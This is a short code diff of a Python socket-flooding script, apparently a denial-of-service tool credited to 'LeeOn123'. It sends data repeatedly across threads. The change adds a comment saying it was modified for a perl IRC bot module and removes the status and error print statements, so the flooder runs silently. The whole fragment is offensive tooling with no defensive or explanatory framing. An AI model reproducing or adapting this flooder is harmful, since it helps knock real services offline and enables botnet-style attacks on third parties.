@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-#Code by LeeOn123
+#Code by LeeOn123 - modified by independent for perl irc bot module
 import random
 import socket
 import threading
@@ -33,10 +33,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Sent!!!")
+			
 		except:
 			s.close()
-			print("[*] Error")
+		
 
 for y in range(threads):
 	if choice == 'y':
